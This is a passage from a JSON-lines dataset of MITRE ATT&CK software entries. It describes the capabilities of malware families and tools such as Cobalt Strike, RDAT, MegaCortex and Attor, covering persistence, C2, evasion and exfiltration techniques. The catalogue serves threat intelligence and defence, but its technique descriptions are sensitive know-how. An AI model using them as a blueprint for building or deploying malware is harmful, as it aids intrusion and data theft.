host without direct internet access.", "Cobalt Strike can use WMI to deliver a payload to a remote host.", "Cobalt Strike can perform pass the hash.", "Cobalt Strike can query shared drives on the local system.", "Cobalt Strike can use self signed Java applets to execute signed applet attacks.", "Cobalt Strike's Beacon payload can collect information on process details.", "Cobalt Strike has the ability to use Smart Applet attacks to disable the Java SecurityManager sandbox.", "Cobalt Strike can execute a payload on a remote host with PowerShell. This technique does not write any data to disk. Cobalt Strike can also use PowerSploit and other scripting frameworks to perform execution.", "Cobalt Strike uses a custom command and control protocol that is encapsulated in HTTP, HTTPS, or DNS. In addition, it conducts peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol. All protocols use their standard assigned ports.", "Cobalt Strike can conduct peer-to-peer communication over Windows named pipes encapsulated in the SMB protocol. All protocols use their standard assigned ports.", "Cobalt Strike will break large data sets into smaller chunks for exfiltration.", "Cobalt Strike can be configured to use TCP, ICMP, and UDP for C2 communications.", "Cobalt Strike can install a new service.", "Cobalt Strike's Beacon payload is capable of capturing screenshots.", "Cobalt Strike can modify Registry values within <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Office\\<Excel Version>\\Excel\\Security\\AccessVBOM\\</code> to enable the execution of additional code.", "Cobalt Strike can use <code>sudo</code> to run a command.", "Cobalt Strike can mimic the HTTP protocol for C2 communication, while hiding the actual data in either an HTTP header, URI parameter, the transaction body, or appending it to the URI.", "Cobalt Strike can deliver additional payloads to victim machines.", "Cobalt Strike can use a custom command and control protocol that can be encapsulated in HTTP or HTTPS. All protocols use their standard assigned ports.", "Cobalt Strike's Beacon payload is capable of running shell commands without <code>cmd.exe</code> and PowerShell commands without <code>powershell.exe</code>", "Cobalt Strike's \"beacon\" payload can receive C2 from one protocol and respond on another. This is typically a mixture of HTTP, HTTPS, and DNS traffic.", "Cobalt Strike can use PsExec to execute a payload on a remote host. It can also use Service Control Manager to start new services.", "Cobalt Strike can use a number of known techniques to bypass Windows UAC.", "Cobalt Strike can use known credentials to run commands and spawn processes as a local user account.", "Cobalt Strike can make tokens from known credentials.", "Cobalt Strike can exploit Oracle Java vulnerabilities for execution, including CVE-2011-3544, CVE-2013-2465, CVE-2012-4681, and CVE-2013-2460.", "Cobalt Strike can exploit vulnerabilities such as MS14-058.", "Cobalt Strike has the ability to use an Excel Workbook to execute additional code by enabling Office to trust macros and execute code without user permission.", "Cobalt Strike uses a custom command and control protocol that communicates over commonly used ports. The C2 protocol is encapsulated in common application layer protocols.", "Cobalt Strike can start a VNC-based remote desktop server and tunnel the connection through the already established C2 channel."], "is_subtechnique": false}
{"text": " [Lslsass](https://attack.mitre.org/software/S0121) is a publicly-available tool that can dump active logon session password hashes from the lsass process. (Citation: Mandiant APT1)", "idx": "https://attack.mitre.org/software/S0121", "title": "Lslsass", "entity": "Lslsass", "entity_type": "software", "entity_context": ["Lslsass can dump active logon session password hashes from the lsass process."], "is_subtechnique": false}
{"text": " [RDAT](https://attack.mitre.org/software/S0495) is a backdoor used by the suspected Iranian threat group [OilRig](https://attack.mitre.org/groups/G0049). [RDAT](https://attack.mitre.org/software/S0495) was originally identified in 2017 and targeted companies in the telecommunications sector.(Citation: Unit42 RDAT July 2020)", "idx": "https://attack.mitre.org/software/S0495", "title": "RDAT", "entity": "RDAT", "entity_type": "software", "entity_context": ["RDAT has executed commands using <code>cmd.exe /c</code>.\t", "RDAT can use email attachments for C2 communications.", "RDAT can communicate with the C2 via base32-encoded subdomains.\t", "RDAT can issue SOAP requests to delete already processed C2 emails. RDAT can also delete itself from the infected system.\t", "RDAT can download files via DNS.\t", "RDAT can communicate with the C2 via subdomains that utilize base64 with character substitutions.\t", "RDAT can process steganographic images attached to email messages to send and receive C2 commands. RDAT can also embed additional messages within BMP images to communicate with the RDAT operator.\t", "RDAT has masqueraded as VMware.exe.\t", "RDAT can take a screenshot on the infected system.\t", "RDAT has used HTTP if DNS C2 communications were not functioning.\t", "RDAT can also embed data within a BMP image prior to exfiltration.\t", "RDAT can deobfuscate the base64-encoded and AES-encrypted files downloaded from the C2 server.\t", "RDAT has used Windows Video Service as a name for malicious services.", "RDAT can upload a file via HTTP POST response to the C2 split into 102,400-byte portions. RDAT can also download data from the C2 which is split into 81,920-byte portions.\t", "RDAT has used AES ciphertext to encode C2 communications.", "RDAT has used encoded data within subdomains as AES ciphertext to communicate from the host to the C2.", "RDAT can use HTTP communications for C2, as well as using the WinHTTP library to make requests to the Exchange Web Services API.", "RDAT has used DNS to communicate with the C2.\t", "RDAT has created a service when it is installed on the victim machine.\t", "RDAT can exfiltrate data gathered from the infected system via the established Exchange Web Services API C2 channel."], "is_subtechnique": false}
{"text": " [Downdelph](https://attack.mitre.org/software/S0134) is a first-stage downloader written in Delphi that has been used by [APT28](https://attack.mitre.org/groups/G0007) in rare instances between 2013 and 2015. (Citation: ESET Sednit Part 3)", "idx": "https://attack.mitre.org/software/S0134", "title": "Downdelph", "entity": "Downdelph", "entity_type": "software", "entity_context": ["Downdelph uses RC4 to encrypt C2 responses.", "Downdelph bypasses UAC to escalate privileges by using a custom “RedirectEXE” shim database.", "Downdelph inserts pseudo-random characters between each original character during encoding of C2 network requests, making it difficult to write signatures on them.", "After downloading its main config file, Downdelph downloads multiple payloads from C2 servers.", "Downdelph uses search order hijacking of the Windows executable sysprep.exe to escalate privileges."], "is_subtechnique": false}
{"text": " [Pillowmint](https://attack.mitre.org/software/S0517) is a point-of-sale malware used by [FIN7](https://attack.mitre.org/groups/G0046) designed to capture credit card information.(Citation: Trustwave Pillowmint June 2020)", "idx": "https://attack.mitre.org/software/S0517", "title": "Pillowmint", "entity": "Pillowmint", "entity_type": "software", "entity_context": ["Pillowmint has used shellcode which reads code stored in the registry keys <code>\\REGISTRY\\SOFTWARE\\Microsoft\\DRM</code> using the native Windows API as well as read <code>HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces</code> as part of its C2.\t", "Pillowmint has collected credit card data using native API functions.", "Pillowmint has stored its malicious payload in the registry key <code>HKLM\\SOFTWARE\\Microsoft\\DRM</code>.", "Pillowmint has used the NtQueueApcThread syscall to inject code into svchost.exe.", "Pillowmint can uninstall the malicious service from an infected machine.", "Pillowmint has deleted the filepath <code>%APPDATA%\\Intel\\devmonsrv.exe</code>.", "Pillowmint has encrypted stolen credit card information with AES and further encoded it with Base64.\t", "Pillowmint has used a PowerShell script to install a shim database.\t", "Pillowmint has been decompressed by included shellcode prior to being launched.\t", "Pillowmint has been compressed and stored within a registry key. Pillowmint has also obfuscated the AES key used for encryption.\t", "Pillowmint has used multiple native Windows APIs to execute and conduct process injections.", "Pillowmint has used a malicious shim database to maintain persistence.", "Pillowmint can iterate through running processes every six seconds collecting a list of processes to capture from later.\t"], "is_subtechnique": false}
{"text": " [Cannon](https://attack.mitre.org/software/S0351) is a Trojan with variants written in C# and Delphi. It was first observed in April 2018. (Citation: Unit42 Cannon Nov 2018)(Citation: Unit42 Sofacy Dec 2018)", "idx": "https://attack.mitre.org/software/S0351", "title": "Cannon", "entity": "Cannon", "entity_type": "software", "entity_context": ["Cannon can take a screenshot of the desktop.", "Cannon exfiltrates collected data over email via SMTP/S and POP3/S C2 channels.", "Cannon can obtain victim drive information as well as a list of folders in C:\\Program Files.", "Cannon can gather system information from the victim’s machine such as the OS version, machine name, and drive information.", "Cannon can download a payload for execution.", "Cannon can gather the username from the system.", "Cannon can collect the current time zone information from the victim’s machine.", "Cannon uses SMTP/S and POP3/S for C2 communications by sending and receiving emails.", "Cannon adds the Registry key <code>HKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon</code> to establish persistence.", "Cannon can obtain a list of processes running on the system."], "is_subtechnique": false}
{"text": " [ServHelper](https://attack.mitre.org/software/S0382) is a backdoor first observed in late 2018. The backdoor is written in Delphi and is typically delivered as a DLL file.(Citation: Proofpoint TA505 Jan 2019)", "idx": "https://attack.mitre.org/software/S0382", "title": "ServHelper", "entity": "ServHelper", "entity_type": "software", "entity_context": ["ServHelper will attempt to enumerate the username of the victim.", "ServHelper will attempt to enumerate Windows version and system architecture.", "ServHelper may attempt to establish persistence via the <code>HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\</code> run key.", "ServHelper can execute shell commands against cmd.", "ServHelper has used port 80 and 443 for C2.", "ServHelper has the ability to execute a PowerShell script to get information from the infected host.", "ServHelper uses HTTP for C2.", "ServHelper contains a module for downloading and executing DLLs that leverages <code>rundll32.exe</code>.", "ServHelper has created a new user and added it to the \"Remote Desktop Users\" and \"Administrators\" groups.", "ServHelper may set up a reverse SSH tunnel to give the attacker access to services running on the victim, such as RDP.", "ServHelper has a module to delete itself from the infected machine.", "ServHelper may download additional files to execute.", "ServHelper has commands for adding a remote desktop user and sending RDP traffic to the attacker through a reverse SSH tunnel.", "ServHelper contains modules that will use schtasks to carry out malicious operations."], "is_subtechnique": false}
{"text": " [NativeZone](https://attack.mitre.org/software/S0637) is the name given collectively to disposable custom [Cobalt Strike](https://attack.mitre.org/software/S0154) loaders used by [APT29](https://attack.mitre.org/groups/G0016) since at least 2021.(Citation: MSTIC Nobelium Toolset May 2021)(Citation: SentinelOne NobleBaron June 2021)", "idx": "https://attack.mitre.org/software/S0637", "title": "NativeZone", "entity": "NativeZone", "entity_type": "software", "entity_context": ["NativeZone has used rundll32 to execute a malicious DLL.", "NativeZone can display an RTF document to the user  to enable execution of  Cobalt Strike stage shellcode.", "NativeZone has checked if Vmware or VirtualBox VM is running on a compromised host.", "NativeZone has, upon execution, displayed a message box that appears to be related to a Ukrainian electronic document management system.", "NativeZone can check for the presence of KM.EkeyAlmaz1C.dll and will halt execution unless it is in the same directory as the rest of the malware's components.", "NativeZone can decrypt and decode embedded  Cobalt Strike beacon stage shellcode."], "is_subtechnique": false}
{"text": " [Doki](https://attack.mitre.org/software/S0600) is a backdoor that uses a unique Dogecoin-based Domain Generation Algorithm and was first observed in July 2020. [Doki](https://attack.mitre.org/software/S0600) was used in conjunction with the [Ngrok](https://attack.mitre.org/software/S0508) Mining Botnet in a campaign that targeted Docker servers in cloud platforms. (Citation: Intezer Doki July 20)", "idx": "https://attack.mitre.org/software/S0600", "title": "Doki", "entity": "Doki", "entity_type": "software", "entity_context": ["Doki has used the DynDNS service and a DGA based on the Dogecoin blockchain to generate C2 domains.", "Doki has searched for the current process’s PID.", "Doki has used a script that gathers information from a hardcoded list of IP addresses and uploads to an Ngrok URL.", "Doki was run through a deployed container.", "Doki’s container was configured to bind the host root directory.", "Doki has communicated with C2 over HTTPS.", "Doki has used Ngrok to establish C2 and exfiltrate data.", "Doki has disguised a file as a Linux kernel module.", "Doki has used the embedTLS library for network communications.", "Doki has downloaded scripts from C2.", "Doki has resolved the path of a process PID to use as a script argument.", "Doki has executed shell scripts with /bin/sh.", "Doki has used the dogechain.info API to generate a C2 address.", "Doki was executed through an open Docker daemon API port."], "is_subtechnique": false}
{"text": " [MegaCortex](https://attack.mitre.org/software/S0576) is ransomware that first appeared in May 2019. (Citation: IBM MegaCortex) [MegaCortex](https://attack.mitre.org/software/S0576) has mainly targeted industrial organizations. (Citation: FireEye Ransomware Disrupt Industrial Production)(Citation: FireEye Financial Actors Moving into OT)", "idx": "https://attack.mitre.org/software/S0576", "title": "MegaCortex", "entity": "MegaCortex", "entity_type": "software", "entity_context": ["MegaCortex has added entries to the Registry for ransom contact information.", "After escalating privileges, MegaCortex calls <code>TerminateProcess()</code>, <code>CreateRemoteThread</code>, and other Win32 APIs.", "MegaCortex can wipe deleted data from all drives using <code>cipher.exe</code>.", "MegaCortex can parse the available drives and directories to determine which files to encrypt. ", "MegaCortex has changed user account passwords and logged users off the system.", "MegaCortex has used a Base64 key to decode its components.", "MegaCortex was used to kill endpoint security processes.", "MegaCortex can enable <code>SeDebugPrivilege</code> and adjust token privileges.", "MegaCortex has used the open-source library, Mbed Crypto, and generated AES keys to carry out the file encryption process.", "MegaCortex can stop and disable services on the system. ", "MegaCortex has checked the number of CPUs in the system to avoid being run in a sandbox or emulator. ", "MegaCortex loads <code>injecthelper.dll</code> into a newly created <code>rundll32.exe</code> process.", "MegaCortex has used <code>rundll32.exe</code> to load a DLL for file encryption.", "MegaCortex has used code signing certificates issued to fake companies to bypass security controls.", "MegaCortex has used <code>.cmd</code> scripts on the victim's system. ", "MegaCortex has deleted volume shadow copies using <code>vssadmin.exe</code>."], "is_subtechnique": false}
{"text": " [Janicab](https://attack.mitre.org/software/S0163) is an OS X trojan that relied on a valid developer ID and oblivious users to install it. (Citation: Janicab)", "idx": "https://attack.mitre.org/software/S0163", "title": "Janicab", "entity": "Janicab", "entity_type": "software", "entity_context": ["Janicab captured screenshots and sent them out to a C2 server.", "Janicab used a cron job for persistence on Mac devices.", "Janicab used a valid AppleDeveloperID to sign the code to get past security restrictions.", "Janicab captured audio and sent it out to a C2 server."], "is_subtechnique": false}
{"text": " [RainyDay](https://attack.mitre.org/software/S0629) is a backdoor tool that has been used by [Naikon](https://attack.mitre.org/groups/G0019) since at least 2020.(Citation: Bitdefender Naikon April 2021)", "idx": "https://attack.mitre.org/software/S0629", "title": "RainyDay", "entity": "RainyDay", "entity_type": "software", "entity_context": ["RainyDay can use tools to collect credentials from web browsers.", "RainyDay has the ability to capture screenshots.", "RainyDay can use a file exfiltration tool to upload specific files to Dropbox.\t \n", "RainyDay can enumerate processes on a target system.", "RainyDay has used names to mimic legitimate software including \"vmtoolsd.exe\" to spoof Vmtools.", "RainyDay can use services to establish persistence.", "RainyDay can use RC4 to encrypt C2 communications.", "RainyDay can use the QuarksPwDump tool to obtain local passwords and domain cached credentials.", "RainyDay can decrypt its payload via a XOR key.", "RainyDay has the ability to switch between TCP and HTTP for C2 if one method is not working.", "RainyDay can use proxy tools including boost_proxy_client for reverse proxy functionality.", "RainyDay can use TCP in C2 communications.", "RainyDay can use a file exfiltration tool to collect recently changed files with specific extensions.", "RainyDay has the ability to uninstall itself by deleting its service and files.", "RainyDay can use HTTP in C2 communications.", "RainyDay has named services and scheduled tasks to appear benign including \"ChromeCheck\" and \"googleupdate.\"", "The file collection tool used by RainyDay can utilize native API including <code>ReadDirectoryChangeW</code> for folder monitoring.", "RainyDay has downloaded as a XOR-encrypted payload.", "RainyDay can use the Windows Command Shell for execution.", "RainyDay can download files to a compromised host.", "RainyDay can use side-loading to run malicious executables.", "RainyDay can use a file exfiltration tool to collect recently changed files on a compromised host.", "RainyDay can use scheduled tasks to achieve persistence.", "RainyDay can create and register a service for execution.", "RainyDay can use a file exfiltration tool to copy files to <code>C:\\ProgramData\\Adobe\\temp</code> prior to exfiltration."], "is_subtechnique": false}
{"text": " [Briba](https://attack.mitre.org/software/S0204) is a trojan used by [Elderwood](https://attack.mitre.org/groups/G0066) to open a backdoor and download files on to compromised hosts. (Citation: Symantec Elderwood Sept 2012) (Citation: Symantec Briba May 2012)", "idx": "https://attack.mitre.org/software/S0204", "title": "Briba", "entity": "Briba", "entity_type": "software", "entity_context": ["Briba uses rundll32 within Registry Run Keys / Startup Folder entries to execute malicious DLLs.", "Briba installs a service pointing to a malicious DLL dropped to disk.", "Briba downloads files onto infected hosts.", "Briba connects to external C2 infrastructure over port 443.", "Briba creates run key Registry entries pointing to malicious DLLs dropped to disk."], "is_subtechnique": false}
{"text": " [Imminent Monitor](https://attack.mitre.org/software/S0434) was a commodity remote access tool (RAT) offered for sale from 2012 until 2019, when an operation was conducted to take down the Imminent Monitor infrastructure. Various cracked versions and variations of this RAT are still in circulation.(Citation: Imminent Unit42 Dec2019)", "idx": "https://attack.mitre.org/software/S0434", "title": "Imminent Monitor", "entity": "Imminent Monitor", "entity_type": "software", "entity_context": ["Imminent Monitor has a dynamic debugging feature to set the file attribute to hidden.", "Imminent Monitor has a module for performing remote desktop access.", "Imminent Monitor has a dynamic debugging feature to check whether it is located in the %TEMP% directory, otherwise it copies itself there.", "Imminent Monitor has a keylogging module.", "Imminent Monitor has a remote webcam monitoring capability.", "Imminent Monitor has decoded malware components that are then dropped to the system.", "Imminent Monitor has a \"Process Watcher\" feature to monitor processes in case the client ever crashes or gets closed.", "Imminent Monitor has deleted files related to its dynamic debugger feature.", "Imminent Monitor has a CommandPromptPacket and ScriptPacket module(s) for creating a remote shell and executing scripts.", "Imminent Monitor has a PasswordRecoveryPacket module for recovering browser passwords.", "Imminent Monitor has encrypted the spearphish attachments to avoid detection from email gateways; the debugger also encrypts information before sending to the C2.", "Imminent Monitor has a remote microphone monitoring capability.", "Imminent Monitor has a feature to disable Windows Task Manager.\t", "Imminent Monitor has the capability to run a cryptocurrency miner on the victim machine.", "Imminent Monitor has leveraged CreateProcessW() call to execute the debugger.", "Imminent Monitor has uploaded a file containing debugger logs, network information and system information to the C2."], "is_subtechnique": false}
{"text": " [T9000](https://attack.mitre.org/software/S0098) is a backdoor that is a newer variant of the T5000 malware family, also known as Plat1. Its primary function is to gather information about the victim. It has been used in multiple targeted attacks against U.S.-based organizations. (Citation: FireEye admin@338 March 2014) (Citation: Palo Alto T9000 Feb 2016)", "idx": "https://attack.mitre.org/software/S0098", "title": "T9000", "entity": "T9000", "entity_type": "software", "entity_context": ["T9000 gathers and beacons the username of the logged in account during installation. It will also gather the username of running processes to determine if it is running as SYSTEM.", "T9000 encrypts collected data using a single byte XOR key.", "T9000 performs checks for various antivirus and security products during installation.", "During the T9000 installation process, it drops a copy of the legitimate Microsoft binary igfxtray.exe. The executable contains a side-loading weakness which is used to load a portion of the malware.", "T9000 searches through connected drives for removable storage devices.", "T9000 gathers and beacons the MAC and IP addresses during installation.", "T9000 gathers and beacons the operating system build number and CPU Architecture (32-bit/64-bit) during installation.", "T9000 can take screenshots of the desktop and target application windows, saving them to user directories as one byte XOR encrypted .dat files.", "T9000 uses the Skype API to record audio and video calls. It writes encrypted data to <code>%APPDATA%\\Intel\\Skype</code>.", "If a victim meets certain criteria, T9000 uses the AppInit_DLL functionality to achieve persistence by ensuring that every user mode process that is spawned will load its malicious DLL, ResN32.dll. It does this by creating the following Registry keys: <code>HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\AppInit_DLLs – %APPDATA%\\Intel\\ResN32.dll</code> and <code>HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\LoadAppInit_DLLs – 0x1</code>.", "T9000 gathers and beacons the system time during installation.", "T9000 searches removable storage devices for files with a pre-defined list of file extensions (e.g. * .doc, *.ppt, *.xls, *.docx, *.pptx, *.xlsx). Any matching files are encrypted and written to a local user directory."], "is_subtechnique": false}
{"text": " [ShimRatReporter](https://attack.mitre.org/software/S0445) is a tool used by suspected Chinese adversary [Mofang](https://attack.mitre.org/groups/G0103) to automatically conduct initial discovery. The details from this discovery are used to customize follow-on payloads (such as [ShimRat](https://attack.mitre.org/software/S0444)) as well as set up faux infrastructure which mimics the adversary's targets. [ShimRatReporter](https://attack.mitre.org/software/S0445) has been used in campaigns targeting multiple countries and sectors including government, military, critical infrastructure, automobile, and weapons development.(Citation: FOX-IT May 2016 Mofang)", "idx": "https://attack.mitre.org/software/S0445", "title": "ShimRatReporter", "entity": "ShimRatReporter", "entity_type": "software", "entity_context": ["ShimRatReporter encrypted gathered information with a combination of shifting and XOR using a static key.", "ShimRatReporter sent collected system and network information compiled into a report to an adversary-controlled C2.", "ShimRatReporter listed all running processes on the machine.", "ShimRatReporter gathered information automatically, without instruction from a C2, related to the user and host machine that is compiled into a report and sent to the operators.", "ShimRatReporter gathered a list of installed software on the infected host.", "ShimRatReporter used several Windows API functions to gather information from the infected system.", "ShimRatReporter gathered the operating system name and specific Windows version of an infected machine.", "ShimRatReporter listed all non-privileged and privileged accounts available on the machine.", "ShimRatReporter used the Windows function <code>GetExtendedUdpTable</code> to detect connected UDP endpoints.", "ShimRatReporter gathered the local privileges for the infected host.", "ShimRatReporter had the ability to download additional payloads.", "ShimRatReporter gathered the local proxy, domain, IP, routing tables, mac address, gateway, DNS servers, and DHCP status information from an infected host.", "ShimRatReporter communicated over HTTP with preconfigured C2 servers.", "ShimRatReporter spoofed itself as <code>AlphaZawgyl_font.exe</code>, a specialized Unicode font.", "ShimRatReporter sent generated reports to the C2 via HTTP POST requests.", "ShimRatReporter used LZ compression to compress initial reconnaissance reports before sending to the C2.\t"], "is_subtechnique": false}
{"text": " [OwaAuth](https://attack.mitre.org/software/S0072) is a Web shell and credential stealer deployed to Microsoft Exchange servers that appears to be exclusively used by [Threat Group-3390](https://attack.mitre.org/groups/G0027). (Citation: Dell TG-3390)", "idx": "https://attack.mitre.org/software/S0072", "title": "OwaAuth", "entity": "OwaAuth", "entity_type": "software", "entity_context": ["OwaAuth uses the filename owaauth.dll, which is a legitimate file that normally resides in <code>%ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\Auth\\</code>; the malicious file by the same name is saved in <code>%ProgramFiles%\\Microsoft\\Exchange Server\\ClientAccess\\Owa\\bin\\</code>.", "OwaAuth is a Web shell that appears to be exclusively used by Threat Group-3390. It is installed as an ISAPI filter on Exchange servers and shares characteristics with the China Chopper Web shell.", "OwaAuth captures and DES-encrypts credentials before writing the username and password to a log file, <code>C:\\log.txt</code>.", "OwaAuth has a command to timestop a file or directory.", "OwaAuth has been loaded onto Exchange servers and disguised as an ISAPI filter (owaauth.dll). The IIS w3wp.exe process then loads the malicious DLL.", "OwaAuth DES-encrypts captured credentials using the key 12345678 before writing the credentials to a log file.", "OwaAuth uses incoming HTTP requests with a username keyword and commands and handles them as instructions to perform actions.", "OwaAuth has a command to list its directory and logical drives."], "is_subtechnique": false}
{"text": " [Attor](https://attack.mitre.org/software/S0438) is a Windows-based espionage platform that has been seen in use since 2013. [Attor](https://attack.mitre.org/software/S0438) has a loadable plugin architecture to customize functionality for specific targets.(Citation: ESET Attor Oct 2019)", "idx": "https://attack.mitre.org/software/S0438", "title": "Attor", "entity": "Attor", "entity_type": "software", "entity_context": ["Attor has a plugin that collects information about inserted storage devices, modems, and phone devices.", "Attor has exfiltrated data over the C2 channel.", "Attor has encrypted data symmetrically using a randomly generated Blowfish (OFB) key which is encrypted with a public RSA key.", "Attor's Blowfish key is encrypted with a public RSA key.", "Attor's has a plugin that is capable of recording audio using available input sound devices.", "Attor can download additional plugins, updates and other files. ", "Attor's dispatcher has used CreateProcessW API for execution.", "Attor has used FTP protocol for C2 communication.", "Attor's dispatcher disguises itself as a legitimate task (i.e., the task name and description appear legitimate).", "Attor monitors the free disk space on the system.", "Attor has staged collected data in a central upload directory prior to exfiltration.", "Attor's dispatcher can modify the Run registry key.", "Attor's dispatcher can inject itself into running processes to gain higher privileges and to evade detection.", "Attor's installer plugin can schedule rundll32.exe to load the dispatcher.", "Attor encrypts collected data with a custom implementation of Blowfish and RSA ciphers.", "Attor has opened the registry and performed query searches.", "Attor has used Tor for C2 communication.", "Attor has automatically collected data about the compromised system.", "Attor can set attributes of log files and directories to HIDDEN, SYSTEM, ARCHIVE, or a combination of those.", "Attor can obtain application window titles and then determines which windows to perform Screen Capture on.", "Attor's dispatcher can be executed as a service.", "Attor has a plugin that enumerates files with specific extensions on all hard disk drives and stores file information in encrypted log files.", "Attor has manipulated the time of last access to files and registry keys after they have been created or modified.", "One of Attor's plugins can collect user credentials via capturing keystrokes and can capture keystrokes pressed within the window of the injected process.", "Attor has a plugin that collects data stored in the Windows clipboard by using the OpenClipboard and GetClipboardData APIs.", "Attor's dispatcher can execute additional plugins by loading the respective DLLs.", "Attor's installer plugin can schedule a new task that loads the dispatcher on boot/logon.", "Attor’s plugin deletes the collected files and log files after exfiltration.", "Attor has a file uploader plugin that automatically exfiltrates the collected data and log files to the C2 server.", "Attor performs the injection by attaching its code into the APC queue using NtQueueApcThread API.", "Attor can detect whether it is executed in some virtualized or emulated environment by searching for specific artifacts, such as communication with I/O ports and using VM-specific instructions.", "Attor's dispatcher can establish persistence by registering a new service.", "Attor's has a plugin that captures screenshots of the target applications.", "Attor's dispatcher can establish persistence via adding a Registry key with a logon script <code>HKEY_CURRENT_USER\\Environment \"UserInitMprLogonScript\" </code>.", "Strings in Attor's components are encrypted with a XOR cipher, using a hardcoded key and the configuration data, log files and plugins are encrypted using a hybrid encryption scheme of Blowfish-OFB combined with RSA."], "is_subtechnique": false}
{"text": " [SslMM](https://attack.mitre.org/software/S0058) is a full-featured backdoor used by [Naikon](https://attack.mitre.org/groups/G0019) that has multiple variants. (Citation: Baumgartner Naikon 2015)", "idx": "https://attack.mitre.org/software/S0058", "title": "SslMM", "entity": "SslMM", "entity_type": "software", "entity_context": ["SslMM identifies and kills anti-malware processes.", "SslMM contains a feature to manipulate process privileges and tokens.", "SslMM sends information to its hard-coded C2, including OS version, service pack information, processor speed, system name, and OS install date.", "SslMM sends the logged-on username to its hard-coded C2.", "SslMM has a hard-coded primary and backup C2 string.", "To establish persistence, SslMM identifies the Start Menu Startup directory and drops a link to its own executable disguised as an “Office Start,” “Yahoo Talk,” “MSN Gaming Z0ne,” or “MSN Talk” shortcut.", "SslMM creates a new thread implementing a keylogging facility using Windows Keyboard Accelerators."], "is_subtechnique": false}
{"text": " [Rising Sun](https://attack.mitre.org/software/S0448) is a modular backdoor malware used extensively in Operation [Sharpshooter](https://attack.mitre.org/groups/G0104). The malware has been observed targeting nuclear, defense, energy, and financial services companies across the world. [Rising Sun](https://attack.mitre.org/software/S0448) uses source code from [Lazarus Group](https://attack.mitre.org/groups/G0032)'s Trojan Duuzer.(Citation: McAfee Sharpshooter December 2018)", "idx": "https://attack.mitre.org/software/S0448", "title": "Rising Sun", "entity": "Rising Sun", "entity_type": "software", "entity_context": ["Rising Sun used dynamic API resolutions to various Windows APIs by leveraging LoadLibrary() and GetProcAddress().", "Rising Sun has used HTTP for command and control.", "Rising Sun can send data gathered from the infected machine via HTTP POST request to the C2.\t", "Rising Sun can delete files specified by the C2.\t", "Rising Sun can detect network adapter and IP address information.\t", "Rising Sun can archive data using RC4 encryption and Base64 encoding prior to exfiltration.\t", "Rising Sun can enumerate all running processes and process information on an infected machine.\t", "Rising Sun can detect the computer name, operating system, and other native system information.\t", "Rising Sun can detect the username of the infected host.\t", "Rising Sun can modify file attributes to hide files.", "Configuration data used by Rising Sun is encrypted using RC4.\t", "Rising Sun can enumerate information about files from the infected system, including file size, attributes, creation time, last access time, and write time. Rising Sun can enumerate the compilation timestamp of Windows executable files.\t", "Rising Sun can clear process memory by overwriting it with junk bytes.\t", "Rising Sun decrypted itself using a single-byte XOR scheme. Additionally, Rising Sun can decrypt its configuration data at runtime.\t", "Rising Sun executed commands using cmd.exe. "], "is_subtechnique": false}
{"text": " [SeaDuke](https://attack.mitre.org/software/S0053) is malware that was used by [APT29](https://attack.mitre.org/groups/G0016) from 2014 to 2015. It was used primarily as a secondary backdoor for victims that were already compromised with [CozyCar](https://attack.mitre.org/software/S0046). (Citation: F-Secure The Dukes)", "idx": "https://attack.mitre.org/software/S0053", "title": "SeaDuke", "entity": "SeaDuke", "entity_type": "software", "entity_context": ["SeaDuke is capable of persisting via the Registry Run key or a .lnk file stored in the Startup directory.", "SeaDuke uses an event filter in WMI code to execute a previously dropped executable shortly after system startup.", "SeaDuke can securely delete files, including deleting itself from the victim.", "SeaDuke has been packed with the UPX packer.", "SeaDuke compressed data with zlib prior to sending it over C2.", "SeaDuke is capable of uploading and downloading files.", "SeaDuke uses a module to execute Mimikatz with PowerShell to perform Pass the Ticket.", "SeaDuke is capable of persisting via a .lnk file stored in the Startup directory.", "SeaDuke uses HTTP and HTTPS for C2.", "Some SeaDuke samples have a module to extract email from Microsoft Exchange servers using compromised credentials.", "Some SeaDuke samples have a module to use pass the ticket with Kerberos for authentication.", "SeaDuke C2 traffic is base64-encoded.", "SeaDuke C2 traffic has been encrypted with RC4 and AES.", "SeaDuke is capable of executing commands."], "is_subtechnique": false}
{"text": " [Ping](https://attack.mitre.org/software/S0097) is an operating system utility commonly used to troubleshoot and verify network connections. (Citation: TechNet Ping)", "idx": "https://attack.mitre.org/software/S0097", "title": "Ping", "entity": "Ping", "entity_type": "software", "entity_context": ["Ping can be used to identify remote systems within a network."], "is_subtechnique": false}
{"text": " [RTM](https://attack.mitre.org/software/S0148) is custom malware written in Delphi. It is used by the group of the same name ([RTM](https://attack.mitre.org/groups/G0048)). Newer versions of the malware have been reported publicly as Redaman.(Citation: ESET RTM Feb 2017)(Citation: Unit42 Redaman January 2019)", "idx": "https://attack.mitre.org/software/S0148", "title": "RTM", "entity": "RTM", "entity_type": "software", "entity_context": ["RTM can record keystrokes from both the keyboard and virtual keyboard.", "RTM tries to add a Registry Run key under the name \"Windows Update\" to establish persistence.", "RTM can scan victim drives to look for specific banking software on the machine to determine next actions.", "RTM can attempt to run the program as admin, then show a fake error message and a legitimate UAC bypass prompt to the user in an attempt to socially engineer the user into escalating privileges.", "RTM uses the command line and rundll32.exe to execute.", "RTM can use the <code>FindNextUrlCacheEntryA</code> and <code>FindFirstUrlCacheEntryA</code> functions to search for specific strings within browser history.", "RTM can download additional files.", "RTM used Port 44443 for its VNC module.", "RTM has the ability to remove Registry entries that it created during execution.", "RTM has resolved Pony C2 server IP addresses by either converting Bitcoin blockchain transaction data to specific octets, or accessing IP addresses directly within the Namecoin blockchain.", "RTM collects data from the clipboard.", "RTM has initiated connections to external domains using HTTPS.\t", "RTM can obtain a list of smart card readers attached to the victim.", "RTM tries to add a scheduled task to establish persistence.", "RTM can add a certificate to the Windows store.", "RTM can check for specific files and directories associated with virtualization and malware analysis.", "RTM can delete all files created during its execution.", "RTM can detect if it is running within a sandbox or other virtualized analysis environment.\t", "RTM has been delivered as archived Windows executable files masquerading as PDF documents.\t", "RTM has been delivered via spearphishing attachments disguised as PDF documents.", "RTM can obtain the victim time zone.", "RTM has named the scheduled task it creates \"Windows Update\".", "RTM has relied on users opening malicious email attachments, 